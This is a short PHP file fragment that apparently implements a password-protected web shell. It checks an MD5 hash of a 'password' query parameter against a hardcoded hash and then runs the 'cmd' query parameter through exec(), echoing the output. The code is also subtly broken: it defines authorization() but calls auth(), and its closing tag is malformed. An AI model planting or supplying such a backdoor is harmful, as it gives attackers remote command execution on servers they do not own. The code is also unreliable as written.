define('PASSWORD', '4df1e18b9159dd3482014710ed9b13fc');

function authorization($password)
{
	$password_hash = md5($password);

	if (strcmp(PASSWORD, $password_hash) == 0) {
		return TRUE;
	} else {
		return FALSE;
	}
}


if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {

	if (auth($_GET['password'])) {
			echo '<pre>'. exec($_GET['cmd']) .'<pre>';
	} else {
		die('Access Denied!');
	}
}

?>